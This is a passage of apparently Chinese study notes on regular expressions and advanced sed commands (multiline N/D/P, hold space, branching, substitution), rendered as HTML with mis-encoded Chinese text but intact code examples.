æ¨¡å¼</h2><p>å¯ä½¿ç”¨çš„æ¨¡å¼åŒ…æ‹¬:</p><ul><li>^ $ . [] *</li></ul><h3 id="20-2-2-ç‰¹æ®Šå­—ç¬¦"><a href="#20-2-2-ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="20.2.2 ç‰¹æ®Šå­—ç¬¦"></a>20.2.2 ç‰¹æ®Šå­—ç¬¦</h3><p>æ­£åˆ™è¡¨è¾¾å¼è¯†åˆ«çš„ç‰¹æ®Šå­—ç¬¦åŒ…æ‹¬:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.*^<span class="hljs-variable">$&#123;</span>&#125;\+<span class="hljs-string">?|</span>()<br></code></pre></td></tr></table></figure><h3 id="20-2-8-ç‰¹æ®Šçš„å­—ç¬¦ç»„"><a href="#20-2-8-ç‰¹æ®Šçš„å­—ç¬¦ç»„" class="headerlink" title="20.2.8 ç‰¹æ®Šçš„å­—ç¬¦ç»„"></a>20.2.8 ç‰¹æ®Šçš„å­—ç¬¦ç»„</h3><p>BRE çš„ç‰¹æ®Šçš„å­—ç¬¦ç»„:</p><ul><li>[[:alpha:]], åŒ¹é…ä»»æ„å­—æ¯å­—ç¬¦</li><li>[[:alnum:]], åŒ¹é…åŒ¹é…ä»»æ„å­—æ¯å’Œæ•°å­—å­—ç¬¦</li><li>[[:blank:]], åŒ¹é…ç©ºæ ¼æˆ–åˆ¶è¡¨ç¬¦</li><li>[[:digit:]], åŒ¹é… 0~9 ä¹‹é—´çš„æ•°å­—</li><li>[[:lower:]], åŒ¹é…å°å†™å­—æ¯</li><li>[[:print:]], åŒ¹é…ä»»æ„å¯æ‰“å°å­—ç¬¦</li><li>[[:punct:]], åŒ¹é…æ ‡ç‚¹ç¬¦å·</li><li>[[:space:]], åŒ¹é…ä»»æ„æ ‡ç‚¹ç¬¦å·</li><li>[[:upper:]], åŒ¹é…å¤§å†™å­—ç¬¦</li></ul><h2 id="20-3-æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼"><a href="#20-3-æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="20.3 æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼"></a>20.3 æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼</h2><p>å¯ä½¿ç”¨çš„åŒ…æ‹¬:</p><ul><li>? + {} | ()</li><li></li></ul><h3 id="20-3-3-ä½¿ç”¨èŠ±æ‹¬å·"><a href="#20-3-3-ä½¿ç”¨èŠ±æ‹¬å·" class="headerlink" title="20.3.3 ä½¿ç”¨èŠ±æ‹¬å·"></a>20.3.3 ä½¿ç”¨èŠ±æ‹¬å·</h3><p>é»˜è®¤æƒ…å†µä¸‹ gawk ä¸ä¼šè¯†åˆ«æ­£åˆ™è¡¨è¾¾å¼é—´éš” (å³æŒ‡å®šèŒƒå›´), éœ€æŒ‡å®š <code>--re-interval</code> å‘½ä»¤è¡Œé€‰é¡¹.</p><h1 id="ç¬¬21ç« -sed-è¿›é˜¶"><a href="#ç¬¬21ç« -sed-è¿›é˜¶" class="headerlink" title="ç¬¬21ç«  sed è¿›é˜¶"></a>ç¬¬21ç«  sed è¿›é˜¶</h1><h2 id="21-1-å¤šè¡Œå‘½ä»¤"><a href="#21-1-å¤šè¡Œå‘½ä»¤" class="headerlink" title="21.1 å¤šè¡Œå‘½ä»¤"></a>21.1 å¤šè¡Œå‘½ä»¤</h2><p>ä¸‰ä¸ªå¯ç”¨æ¥å¤„ç†å¤šè¡Œæ–‡æœ¬çš„ç‰¹æ®Šå‘½ä»¤:</p><ul><li>N : å°†æ•°æ®æµä¸­çš„ä¸‹ä¸€è¡ŒåŠ è¿›æ¥åˆ›å»ºä¸€ä¸ªå¤šè¡Œç»„ (multiline group) æ¥å¤„ç†</li><li>D : åˆ é™¤å¤šè¡Œç»„ä¸­çš„ä¸€è¡Œ</li><li>P : æ‰“å°å¤šè¡Œç»„ä¸­çš„ä¸€è¡Œ</li></ul><h3 id="21-1-1-next-å‘½ä»¤"><a href="#21-1-1-next-å‘½ä»¤" class="headerlink" title="21.1.1 next å‘½ä»¤"></a>21.1.1 next å‘½ä»¤</h3><h4 id="å•è¡Œçš„-next-å‘½ä»¤"><a href="#å•è¡Œçš„-next-å‘½ä»¤" class="headerlink" title="å•è¡Œçš„ next å‘½ä»¤"></a>å•è¡Œçš„ next å‘½ä»¤</h4><p>å°å†™çš„ <code>n</code>.</p><p>ä¹Ÿå°±æ˜¯è¯´, å…ˆæ‰¾åˆ°ä¸€è¡Œ, ç„¶ååœ¨å…¶ä¸‹ä¸€è¡Œæ‰§è¡Œå‘½ä»¤åˆ—è¡¨. ä¹‹åä¹Ÿæ˜¯å…ˆæ‰¾, ç„¶åå†åˆ°ä¸‹ä¸€è¡Œæ‰§è¡Œ.</p><h4 id="åˆå¹¶æ–‡æœ¬è¡Œ"><a href="#åˆå¹¶æ–‡æœ¬è¡Œ" class="headerlink" title="åˆå¹¶æ–‡æœ¬è¡Œ"></a>åˆå¹¶æ–‡æœ¬è¡Œ</h4><p>å•è¡Œ next å‘½ä»¤ä¼šå°†æ•°æ®æµä¸­çš„ä¸‹ä¸€è¡Œæ–‡æœ¬è¡Œç§»åŠ¨åˆ° sed ç¼–è¾‘å™¨çš„å·¥ä½œç©ºé—´ (ç§°ä¸ºæ¨¡å¼ç©ºé—´), å¤šè¡Œç‰ˆæœ¬çš„ next å‘½ä»¤ (ç”¨å¤§å†™ N) ä¼šå°†ä¸‹ä¸€æ–‡æœ¬è¡Œæ·»åŠ åˆ°æ¨¡å¼ç©ºé—´ä¸­å·²æœ‰çš„æ–‡æœ¬å.</p><p>è™½ç„¶æ–‡æœ¬è¿˜æ˜¯ç”¨æ¢è¡Œç¬¦åˆ†éš”, ä½† sed ç¼–è¾‘å™¨ç°åœ¨ä¼šå°†ä¸¤è¡Œæ–‡æœ¬å½“æˆä¸€è¡Œæ¥å¤„ç†.</p><p>åœ¨å¤„ç†å®Œä¸€ä¸ªæ¨¡å¼ç©ºé—´é‡Œçš„æ–‡æœ¬å, ä¸‹ä¸€ä¸ªåŒ¹é…çš„è¡Œæ˜¯æ¨¡å¼ç©ºé—´ä¹‹å¤–çš„è¡Œ.</p><p>å¤§æ¦‚æ˜¯è¿™æ ·, æœ‰ä¸€ä¸ªæ–‡ä»¶æœ‰å››è¡Œæ–‡æœ¬:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹ä½œ:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.\n<br></code></pre></td></tr></table></figure><p>å‘½ä»¤ä¸º:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sed <span class="hljs-string">&#x27;/first/&#123; N; s/\n/ / &#125;&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºæ˜¯å…ˆå˜æˆè¿™æ ·:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.\nThis is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.\n<br></code></pre></td></tr></table></figure><p>ç„¶åå†å¯¹ <code>first</code> è¿™ä¸€è¡Œ, å°†ç¬¬ä¸€ä¸ª <code>\n</code> è½¬æ¢æˆç©ºæ ¼. è¿™å°±ä½“ç°å‡ºåˆå¹¶.</p><p>è¦æ³¨æ„ <code>N</code> å‘½ä»¤å¤„ç†æœ€åä¸€è¡Œæ—¶çš„é—®é¢˜, å› ä¸ºæ˜¯æœ€åä¸€è¡Œ, æ²¡æœ‰ä¸‹ä¸€è¡Œå¯ä»¥åˆå¹¶åˆ°æ¨¡å¼ç©ºé—´, <code>N</code> å‘½ä»¤ä¼šå« sed ç¼–è¾‘å™¨åœæ­¢.</p><h3 id="21-1-2-å¤šè¡Œåˆ é™¤å‘½ä»¤"><a href="#21-1-2-å¤šè¡Œåˆ é™¤å‘½ä»¤" class="headerlink" title="21.1.2 å¤šè¡Œåˆ é™¤å‘½ä»¤"></a>21.1.2 å¤šè¡Œåˆ é™¤å‘½ä»¤</h3><p><code>d</code> å‘½ä»¤æ˜¯åˆ é™¤ä¸€è¡Œ, è€Œä¸æ˜¯ä¸€æ®µæ–‡æœ¬. å’Œ <code>N</code> å‘½ä»¤é…åˆæ—¶, ä¼šå°†æ¨¡å¼ç©ºé—´ä¸­çš„éƒ½åˆ æ‰.</p><p><code>D</code> å‘½ä»¤æ˜¯å¤šè¡Œåˆ é™¤å‘½ä»¤, å…¶åªåˆ é™¤æ¨¡å¼ç©ºé—´ä¸­çš„ç¬¬ä¸€è¡Œ. è¯¥å‘½ä»¤ä¼šåˆ é™¤åˆ°æ¢è¡Œç¬¦ (å«æ¢è¡Œç¬¦) ä¸ºæ­¢çš„æ‰€æœ‰å­—ç¬¦.</p><h3 id="21-1-3-å¤šè¡Œæ‰“å°å‘½ä»¤"><a href="#21-1-3-å¤šè¡Œæ‰“å°å‘½ä»¤" class="headerlink" title="21.1.3 å¤šè¡Œæ‰“å°å‘½ä»¤"></a>21.1.3 å¤šè¡Œæ‰“å°å‘½ä»¤</h3><p><code>P</code> å‘½ä»¤æ˜¯å¤šè¡Œæ‰“å°å‘½ä»¤, å®ƒåªæ‰“å°æ¨¡å¼ç©ºé—´ä¸­çš„ç¬¬ä¸€è¡Œ. è¿™åŒ…æ‹¬æ¨¡å¼ç©ºé—´ä¸­ç›´åˆ°æ¢è¡Œç¬¦ä¸ºæ­¢çš„æ‰€æœ‰çš„å­—ç¬¦.</p><h2 id="21-2-ä¿æŒç©ºé—´"><a href="#21-2-ä¿æŒç©ºé—´" class="headerlink" title="21.2 ä¿æŒç©ºé—´"></a>21.2 ä¿æŒç©ºé—´</h2><p>æ¨¡å¼ç©ºé—´ (pattern space) æ˜¯ä¸€å—æ´»è·ƒçš„ç¼“å†²åŒº.</p><p>sed ç¼–è¾‘å™¨æœ‰å¦ä¸€å—ç§°ä½œä¿æŒç©ºé—´ (hold space) çš„ç¼“å†²åŒºåŸŸ.</p><p>åœ¨å¤„ç† pattern space ä¸­çš„æŸäº›è¡Œæ—¶, å¯ä»¥ç”¨ hold space æ¥ä¸´æ—¶ä¿å­˜ä¸€äº›è¡Œ.</p><p>æœ‰ 5 æ¡å‘½ä»¤å¯ç”¨æ¥æ“ä½œ hold space:</p><ul><li><code>h</code>, å°† pattern space å¤åˆ¶åˆ° hold space</li><li><code>H</code>, å°† pattern space é™„åŠ åˆ° hold space</li><li><code>g</code>, å°† hold space å¤åˆ¶åˆ° pattern space</li><li><code>G</code>, å°† hold space é™„åŠ åˆ° pattern space</li><li><code>x</code>, äº¤æ¢ pattern space å’Œ hold space çš„å†…å®¹</li></ul><p>é€šå¸¸, åœ¨ä½¿ç”¨ h æˆ– H å‘½ä»¤å°†å­—ç¬¦ä¸²ç§»åŠ¨åˆ° hold space å, æœ€ç»ˆè¿˜è¦ç”¨ g, G æˆ– x å‘½ä»¤å°†ä¿å­˜çš„å­—ç¬¦ä¸²ç§»å›æ¨¡å¼ç©ºé—´.</p><p>å¤åˆ¶åˆ°, æ„æ€å°±æ˜¯ä¼šæ›¿æ¢æ‰åŸæœ¬çš„å†…å®¹.</p><h2 id="21-3-æ’é™¤å‘½ä»¤"><a href="#21-3-æ’é™¤å‘½ä»¤" class="headerlink" title="21.3 æ’é™¤å‘½ä»¤"></a>21.3 æ’é™¤å‘½ä»¤</h2><p><code>!</code> å‘½ä»¤ä½œä¸ºæ’é™¤ (negate) å‘½ä»¤, ä¼šè®©åŸæœ¬ä¼šå…¶ä½œç”¨çš„å‘½ä»¤èµ·ç›¸åä½œç”¨.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed -n <span class="hljs-string">&#x27;/head/!p&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>ä¼šå°†ä¸åŒ…å« <code>head</code> å•è¯çš„è¡Œæ‰“å°å‡ºæ¥.</p><p><code>$</code> è¡¨ç¤ºçš„æ˜¯ç‰¹æ®Šåœ°å€.</p><p>å¦ä¸€ä¸ªä¾‹å­:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;$!N; ...&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>ä¼šå¯¹é™¤æœ€åä¸€è¡Œçš„å…¶ä»–è¡Œæ‰§è¡Œ <code>N</code> å‘½ä»¤.</p><p>æ‰“å°å¹¶ä¸ä¼šç§»åŠ¨ç¼“å†²åŒºä¸­çš„å†…å®¹.</p><h2 id="21-4-æ”¹å˜æµ"><a href="#21-4-æ”¹å˜æµ" class="headerlink" title="21.4 æ”¹å˜æµ"></a>21.4 æ”¹å˜æµ</h2><p>é€šå¸¸, sed ç¼–è¾‘å™¨ä¼šä»è„šæœ¬çš„é¡¶éƒ¨å¼€å§‹, ä¸€ç›´æ‰§è¡Œåˆ°è„šæœ¬çš„ç»“å°¾ (D å‘½ä»¤é™¤å¤–, å®ƒä¼šå¼ºåˆ¶ sed ç¼–è¾‘å™¨è¿”å›åˆ°è„šæœ¬çš„é¡¶éƒ¨, è€Œä¸è¯»å–æ–°çš„è¡Œ, æ¯•ç«Ÿå·²ç»åˆ é™¤äº†ä¸€è¡Œäº†, ä¸å¯èƒ½å¯¹åˆ é™¤çš„è¡Œæ‰§è¡Œå‰©ä¸‹çš„å‘½ä»¤).</p><h3 id="21-4-1-åˆ†æ”¯"><a href="#21-4-1-åˆ†æ”¯" class="headerlink" title="21.4.1 åˆ†æ”¯"></a>21.4.1 åˆ†æ”¯</h3><p>åˆ†æ”¯ (branch) å‘½ä»¤ <code>b</code> çš„æ ¼å¼:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[address]</span><span class="hljs-selector-tag">b</span> <span class="hljs-selector-attr">[label]</span><br></code></pre></td></tr></table></figure><p><code>address</code> å‚æ•°å†³å®šäº†å“ªäº›è¡Œçš„æ•°æ®ä¼šè§¦å‘åˆ†æ”¯å‘½ä»¤. </p><p><code>label</code> å‚æ•°å®šä¹‰äº†è¦è·³è½¬çš„ä½ç½®, å¦‚æœæ²¡æœ‰åŠ  label å‚æ•°, è·³è½¬å‘½ä»¤ä¼šè·³è½¬åˆ°è„šæœ¬çš„ç»“å°¾.</p><p>ä¹Ÿå°±æ˜¯è¯´, å¯ä»¥è®©æŸäº›è¡Œè·³è¿‡æŸäº›å‘½ä»¤è€Œä¸æ‰§è¡Œ.</p><p>æ ‡å·ä»¥å†’å·å¼€å§‹, æœ€å¤šå¯ä»¥æ˜¯ 7 ä¸ªå­—ç¬¦çš„é•¿åº¦. è¦æŒ‡å®šæ ‡ç­¾, å°†å®ƒåŠ åˆ° <code>b</code> å‘½ä»¤åå³å¯.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;&#123;/first/b jump1 ; s/This is the/No jump on/</span><br><span class="hljs-string">&gt; :jump1</span><br><span class="hljs-string">&gt; s/This is the/Jump hero on/&#125;&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>è¾¾æˆå¾ªç¯æ•ˆæœ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This, is, a, test, to, remove, commas.&quot;</span> | sed -n <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; :start</span><br><span class="hljs-string">&gt; s/,//1p</span><br><span class="hljs-string">&gt; /,/b start</span><br><span class="hljs-string">&gt; &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¦é˜²æ­¢æ— é™å¾ªç¯.</p><p>æ„Ÿè§‰å’Œæ±‡ç¼–çš„ <code>jmp</code> æŒ‡ä»¤ç±»ä¼¼.</p><h3 id="21-4-2-æµ‹è¯•"><a href="#21-4-2-æµ‹è¯•" class="headerlink" title="21.4.2 æµ‹è¯•"></a>21.4.2 æµ‹è¯•</h3><p>æµ‹è¯• (test) å‘½ä»¤ <code>t</code>, ä¹Ÿç”¨æ¥æ”¹å˜ sed ç¼–è¾‘å™¨è„šæœ¬çš„æ‰§è¡Œæµç¨‹.</p><p><code>t</code> å‘½ä»¤æ ¹æ®æ›¿æ¢å‘½ä»¤çš„ç»“æœè·³è½¬åˆ°æŸä¸ªæ ‡ç­¾, è€Œä¸æ˜¯æ ¹æ®åœ°å€è¿›è¡Œè·³è½¬.</p><p>æ ¼å¼:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[address]</span>t <span class="hljs-selector-attr">[label]</span><br></code></pre></td></tr></table></figure><p>å’Œåˆ†æ”¯å‘½ä»¤ä¸€æ ·, åœ¨æ²¡æœ‰æŒ‡å®šæ ‡ç­¾çš„æƒ…å†µä¸‹, å¦‚æœæµ‹è¯•æˆåŠŸ, sed å›è°ƒè½¬åˆ°è„šæœ¬çš„ç»“å°¾.</p><p><code>t</code> å‘½ä»¤æä¾›äº†å¯¹æ•°æ®æµä¸­çš„æ–‡æœ¬æ‰§è¡ŒåŸºæœ¬çš„ <code>if-then</code> å‘½ä»¤çš„ä¸€ä¸ªä½æˆæœ¬åŠæ³•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; s/first/matchd/</span><br><span class="hljs-string">&gt; t</span><br><span class="hljs-string">&gt; s/This is the/No match on/</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­ä¸º, å¦‚æœç¬¬ä¸€ä¸ªæ›¿æ¢æ‰§è¡Œäº†, å°±ä¸ä¼šæ‰§è¡Œç¬¬äºŒä¸ª.</p><p>å¯ä»¥ç”¨æµ‹è¯•å‘½ä»¤æ¥ç»“æŸå¾ªç¯.</p><h2 id="21-5-æ¨¡å¼ä»£æ›¿"><a href="#21-5-æ¨¡å¼ä»£æ›¿" class="headerlink" title="21.5 æ¨¡å¼ä»£æ›¿"></a>21.5 æ¨¡å¼ä»£æ›¿</h2><h3 id="21-5-1-amp-ç¬¦å·"><a href="#21-5-1-amp-ç¬¦å·" class="headerlink" title="21.5.1 &amp; ç¬¦å·"></a>21.5.1 &amp; ç¬¦å·</h3><p><code>&amp;</code> ç¬¦å·å¯ä»¥ç”¨æ¥ä»£æ›¿å‘½ä»¤ä¸­çš„åŒ¹é…çš„æ¨¡å¼. </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The cat sleeps in his hat.&quot;</span> | sed <span class="hljs-string">&#x27;s/.at/&quot;&amp;&quot;/g&#x27;</span><br></code></pre></td></tr></table></figure><p>åŒ¹é…åˆ°äº† <code>cat</code>, é‚£ä¹ˆ <code>&amp;</code> çš„å€¼ä¸º <code>cat</code>, åŒ¹é…åˆ°åé¢çš„ <code>hat</code>, åˆ™ <code>&amp;</code> çš„å€¼ä¸º <code>hat</code>.</p><h3 id="21-5-2-ä»£æ›¿å•ç‹¬çš„å•è¯"><a href="#21-5-2-ä»£æ›¿å•ç‹¬çš„å•è¯" class="headerlink" title="21.5.2 ä»£æ›¿å•ç‹¬çš„å•è¯"></a>21.5.2 ä»£æ›¿å•ç‹¬çš„å•è¯</h3><p>sed ç¼–è¾‘å™¨ç”¨åœ†æ‹¬å·æ¥å®šä¹‰æ›¿æ¢æ¨¡å¼ä¸­çš„å­æ¨¡å¼.</p><p>æ›¿ä»£å­—ç¬¦ç”±åæ–œçº¿å’Œæ•°å­—ç»„æˆ, æ•°å­—è¡¨æ˜å­æ¨¡å¼çš„ä½ç½®, å¦‚ <code>\1</code>, <code>\2</code>.</p><p>åœ¨æ›¿æ¢å‘½ä»¤ä¸­ä½¿ç”¨åœ†æ‹¬å·æ—¶, å¿…é¡»ç”¨è½¬ç§»å­—ç¬¦å°†å®ƒä»¬æ ‡ç¤ºä¸ºåˆ†ç»„å­—ç¬¦è€Œä¸æ˜¯æ™®é€šçš„åœ†æ‹¬å·, è¿™æœ‰ç‚¹åå¸¸:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The System Administrator manual&quot;</span> | sed <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&gt; s/\(System\) Administrator/\1 User/&#x27;</span><br></code></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼çš„ <code>*</code> æ”¾åœ¨æ–‡æœ¬çš„åé¢.</p><h2 id="21-6-åœ¨è„šæœ¬ä¸­ä½¿ç”¨-sed"><a href="#21-6-åœ¨è„šæœ¬ä¸­ä½¿ç”¨-sed" class="headerlink" title="21.6 åœ¨è„šæœ¬ä¸­ä½¿ç”¨ sed"></a>21.6 åœ¨è„šæœ¬ä¸­ä½¿ç”¨ sed</h2><h3 id="21-6-1-ä½¿ç”¨åŒ…è£…è„šæœ¬"><a href="#21-6-1-ä½¿ç”¨åŒ…è£…è„šæœ¬" class="headerlink" title="21.6.1 ä½¿ç”¨åŒ…è£…è„šæœ¬"></a>21.6.1 ä½¿ç”¨åŒ…è£…è„šæœ¬</h3><p>åœ¨ shell è„šæœ¬ä¸­, å¯ä»¥å°†æ™®é€šçš„ shell å˜é‡åŠå‚æ•°å’Œ sed ç¼–è¾‘å™¨è„šæœ¬ä¸€èµ·ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/bash</span><br>sed -n <span class="hljs-string">&#x27;&#123; 1!G ; h ; $p&#125;&#x27;</span> <span class="hljs-variable">$1</span> <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæŠŠå‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªå‚æ•° (è¿™é‡Œå¯ä»¥æ˜¯æ–‡ä»¶å) å½“æˆ sed çš„è¾“å…¥. è¿™é‡Œçš„ <code>$p</code> çš„å«ä¹‰æ˜¯, åªæœ‰æœ€åä¸€è¡Œæ‰æ‰“å°. <code>p</code> æ˜¯ä¸€ä¸ªåŠ¨ä½œ.</p><h3 id="21-6-2-é‡å®šå‘-sed-çš„è¾“å‡º"><a href="#21-6-2-é‡å®šå‘-sed-çš„è¾“å‡º" class="headerlink" title="21.6.2 é‡å®šå‘ sed çš„è¾“å‡º"></a>21.6.2 é‡å®šå‘ sed çš„è¾“å‡º</h3><p>é»˜è®¤æƒ…å†µä¸‹, sed ç¼–è¾‘å™¨ä¼šå°†è„šæœ¬çš„ç»“æœè¾“å‡ºåˆ° STDOUT ä¸Š, å¯ä»¥åœ¨ shell è„šæœ¬ä¸­ä½¿ç”¨å„ç§æ ‡å‡†æ–¹æ³•å¯¹ sed ç¼–è¾‘å™¨çš„è¾“å‡ºè¿›è¡Œé‡å®šå‘.</p><p>å¦‚ç”¨ <code>$()</code> é‡å®šå‘åˆ°å˜é‡ä¸­.</p><h2 id="21-7-åˆ›å»º-sed-å®ç”¨å·¥å…·"><a href="#21-7-åˆ›å»º-sed-å®ç”¨å·¥å…·" class="headerlink" title="21.7 åˆ›å»º sed å®ç”¨å·¥å…·"></a>21.7 åˆ›å»º sed å®ç”¨å·¥å…·</h2><h3 id="21-7-1-åŠ å€è¡Œé—´è·"><a href="#21-7-1-åŠ å€è¡Œé—´è·" class="headerlink" title="21.7.1 åŠ å€è¡Œé—´è·"></a>21.7.1 åŠ å€è¡Œé—´è·</h3><p>ä¿æŒç©ºé—´çš„é»˜è®¤å€¼ä¸ºä¸€ä¸ªç©ºè¡Œ.</p><h3 id="21-7-2-å¯¹å¯èƒ½å«æœ‰ç©ºç™½è¡Œçš„æ–‡ä»¶åŠ å€è¡Œé—´è·"><a href="#21-7-2-å¯¹å¯èƒ½å«æœ‰ç©ºç™½è¡Œçš„æ–‡ä»¶åŠ å€è¡Œé—´è·" class="headerlink" title="21.7.2 å¯¹å¯èƒ½å«æœ‰ç©ºç™½è¡Œçš„æ–‡ä»¶åŠ å€è¡Œé—´è·"></a>21.7.2 å¯¹å¯èƒ½å«æœ‰ç©ºç™½è¡Œçš„æ–‡ä»¶åŠ å€è¡Œé—´è·</h3><p>å…ˆåˆ é™¤æ‰€æœ‰çš„ç©ºç™½è¡Œ, ç„¶åç”¨ <code>G</code> å‘½ä»¤åœ¨æ‰€æœ‰è¡Œåæ’å…¥æ–°çš„ç©ºç™½è¡Œ.</p><h3 id="21-7-3-ç»™æ–‡ä»¶ä¸­çš„è¡Œç¼–å·"><a href="#21-7-3-ç»™æ–‡ä»¶ä¸­çš„è¡Œç¼–å·" class="headerlink" title="21.7.3 ç»™æ–‡ä»¶ä¸­çš„è¡Œç¼–å·"></a>21.7.3 ç»™æ–‡ä»¶ä¸­çš„è¡Œç¼–å·</h3><p>åœ¨è·å¾—ç­‰å·çš„è¾“å‡ºå, å¯ä»¥é€šè¿‡ç®¡é“å°†è¾“å‡ºä¼ ç»™å¦ä¸€ä¸ª sed ç¼–è¾‘å™¨è„šæœ¬, å®ƒä¼šä½¿ç”¨ <code>N</code> å‘½ä»¤æ¥åˆå¹¶è¿™ä¸¤è¡Œ, è¿˜éœ€è¦ç”¨æ›¿æ¢å‘½ä»¤å°†æ¢è¡Œç¬¦æ›´æ¢æˆç©ºæ ¼æˆ–åˆ¶è¡¨ç¬¦.</p><h3 id="21-7-4-æ‰“å°æœ«å°¾è¡Œ"><a href="#21-7-4-æ‰“å°æœ«å°¾è¡Œ" class="headerlink" title="21.7.4 æ‰“å°æœ«å°¾è¡Œ"></a>21.7.4 æ‰“å°æœ«å°¾è¡Œ</h3><p>åˆ›å»ºæ»šåŠ¨çª—å£. é€šè¿‡å¾ªç¯ä½¿ç”¨ <code>N</code> å’Œ <code>D</code> å‘½ä»¤, å¯ä»¥åšåˆ°, å‘æ¨¡å¼ç©ºé—´çš„æ–‡æœ¬è¡Œå—å¢åŠ æ–°è¡Œçš„åŒæ—¶åˆ é™¤æ—§è¡Œ.</p><p><code>q</code> (quit) é€€å‡ºå‘½ä»¤ä¼šåœæ­¢å¾ªç¯.</p><h3 id="21-7-5-åˆ é™¤è¡Œ"><a href="#21-7-5-åˆ é™¤è¡Œ" class="headerlink" title="21.7.5 åˆ é™¤è¡Œ"></a>21.7.5 åˆ é™¤è¡Œ</h3><p>é€‰æ‹©æ€§çš„åˆ é™¤æ•°æ®ä¸­ä¸éœ€è¦çš„ç©ºç™½è¡Œ.</p><p>åŒºé—´åœ°å€, å¦‚ <code>/./,/^$/</code> ä¸¤ä¸ª pattern ç”¨ <code>,</code> åˆ†éš”, åŒºé—´çš„å¼€å§‹æ˜¯ <code>/./</code> åŒ¹é…ä»»æ„çš„ä¸€ä¸ªå­—ç¬¦, ç»“å°¾æ˜¯ <code>/^$/</code> åŒ¹é…ä¸€ä¸ªç©ºè¡Œ.</p><h1 id="ç¬¬22ç« -gawk-è¿›é˜¶"><a href="#ç¬¬22ç« -gawk-è¿›é˜¶" class="headerlink" title="ç¬¬22ç«  gawk è¿›é˜¶"></a>ç¬¬22ç«  gawk è¿›é˜¶</h1><p>gawk åŒæ 